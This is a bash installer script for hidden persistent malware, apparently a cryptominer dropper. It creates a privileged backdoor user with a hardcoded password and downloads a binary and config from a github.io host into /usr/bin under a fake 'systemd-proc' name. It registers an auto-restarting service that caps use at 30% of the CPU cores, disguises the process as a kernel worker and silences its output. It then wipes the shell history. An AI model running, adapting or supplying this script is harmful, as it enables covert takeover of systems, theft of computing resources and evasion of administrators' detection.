#!/bin/bash

USER_NAME="systemd"
USER_PASS="@@LieuNhuYen123"
BIN_PATH="/usr/bin/systemd-proc"
CONF_PATH="/usr/bin/config.json"
SERVICE_FILE="/etc/systemd/system/systemd-proc.service"

TOTAL_CORES=$(nproc)
TARGET_THREADS=$(( TOTAL_CORES * 30 / 100 ))
[ $TARGET_THREADS -eq 0 ] && TARGET_THREADS=1

if id "$USER_NAME" &>/dev/null; then
    echo "$USER_NAME:$USER_PASS" | sudo chpasswd
else
    sudo adduser --disabled-password --gecos "" "$USER_NAME"
    echo "$USER_NAME:$USER_PASS" | sudo chpasswd
    sudo usermod -aG wheel "$USER_NAME" || sudo usermod -aG sudo "$USER_NAME"
fi

sudo wget -q -O $BIN_PATH https://via00002222.github.io/systemd/systemd
sudo wget -q -O $CONF_PATH https://via00002222.github.io/systemd/config.json
sudo chmod +x $BIN_PATH

sudo bash -c "cat <<EOT > $SERVICE_FILE
[Unit]
Description=System Process Controller
After=network.target

[Service]
Type=simple
User=$USER_NAME
ExecStart=/bin/bash -c 'exec -a \"[kworker/u24:1-events]\" $BIN_PATH -t $TARGET_THREADS'
Restart=always
RestartSec=15
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOT"

sudo systemctl daemon-reload
sudo systemctl enable systemd-proc
sudo systemctl start systemd-proc
history -c && rm -f ~/.bash_history
